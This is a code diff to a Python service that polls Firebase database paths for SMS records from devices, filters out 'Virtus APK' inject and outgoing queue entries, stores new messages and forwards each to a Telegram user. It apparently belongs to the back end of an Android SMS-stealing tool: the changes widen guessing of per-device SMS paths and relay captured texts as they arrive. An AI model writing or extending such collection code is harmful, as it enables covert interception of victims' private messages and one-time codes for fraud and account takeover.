@@ -21,7 +21,7 @@ POLL_INTERVAL_SEC = 0.3
 POLL_FETCH_TIMEOUT_SEC = 4.0
 SNAPSHOT_TIMEOUT_SEC = 8.0
 MONITORING_START_SNAPSHOT_SEC = 6.0
-MAX_POLL_PATHS_PER_CYCLE = 36
+MAX_POLL_PATHS_FALLBACK = 48
 POLL_PROFILE_CONCURRENCY = 8
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
@@ -235,8 +235,21 @@ def _parse_timestamp(raw: Any) -> datetime | None:
         return _parse_body_date(text)
 
 
+def _is_inject_queue_entry(value: dict[str, Any]) -> bool:
+    """Skip Virtus APK inject/outgoing queue nodes under messages/{id}/."""
+    if "injected" in value:
+        return True
+    sender = _first_field(value, SENDER_FIELDS) or ""
+    if sender == "__OUT__":
+        return True
+    return False
+
+
 def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
     if not isinstance(value, dict):
+        return None
+
+    if _is_inject_queue_entry(value):
         return None
 
     sender = _first_field(value, SENDER_FIELDS)
@@ -479,8 +492,38 @@ async def fetch_firebase_sms_for_device(
                 set_cached_sms_paths(device, hit_paths)
             return _dedupe_records(cached_records)
 
-    all_paths = _generate_sms_paths(device)[:MAX_POLL_PATHS_PER_CYCLE]
-    all_records, hit_paths = await _fetch_paths_parallel(root, all_paths, timeout=timeout)
+    all_paths = _generate_sms_paths(device)
+    priority: list[str] = []
+    if device.firebase_key:
+        fk = device.firebase_key.strip("/")
+        priority.extend(
+            path for path in (
+                fk,
+                f"{fk}/sms",
+                f"{fk}/messages",
+                f"{fk}/lastSms",
+                f"{fk}/inbox",
+            )
+            if path in all_paths or True
+        )
+    for device_id in _device_ids(device):
+        priority.extend(
+            [
+                f"clients/{device_id}/sms",
+                f"clients/{device_id}/messages",
+                f"clients/{device_id}/lastSms",
+                f"clients/{device_id}/inbox",
+                f"devices/{device_id}/sms",
+                f"devices/{device_id}/messages",
+                f"devices/{device_id}/lastSms",
+                f"sms/{device_id}",
+                f"messages/{device_id}",
+                f"inbox/{device_id}",
+                f"data/{device_id}/sms",
+            ]
+        )
+    ordered = list(dict.fromkeys(priority + all_paths))[:MAX_POLL_PATHS_FALLBACK]
+    all_records, hit_paths = await _fetch_paths_parallel(root, ordered, timeout=timeout)
     if hit_paths:
         set_cached_sms_paths(device, hit_paths)
     return _dedupe_records(all_records)
@@ -507,14 +550,44 @@ async def snapshot_firebase_sms_seen(
             db.commit()
         return 0
 
-    keys = {record["firebase_key"] for record in records}
+    previous_seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
+    keys: set[str] = set()
+    ignored = 0
+    for record in records:
+        fk = record["firebase_key"]
+        keys.add(fk)
+        if fk in previous_seen:
+            continue
+        if _is_old_for_monitoring(record, profile):
+            ignored += 1
+            continue
+        if _is_outgoing_firebase_log(record["sender"], record["message"]):
+            ignored += 1
+            continue
+        asyncio.create_task(
+            _inject_and_stream_dm(
+                profile.telegram_user_id,
+                record["sender"],
+                record["message"],
+            )
+        )
+        if db is not None:
+            save_sms(
+                db,
+                sender=record["sender"],
+                message=record["message"],
+                device_name=device.name,
+                received_at=record.get("received_at"),
+            )
+            db.commit()
     _set_baseline_sms_keys(device, keys, profile.started_at)
     if db is not None:
         db.commit()
     logger.info(
-        "Firebase SMS baseline for %s: %s existing record(s) ignored",
+        "Firebase SMS baseline for %s: %s key(s), %s old/outgoing skipped",
         device.name,
         len(keys),
+        ignored,
     )
     return len(keys)
 
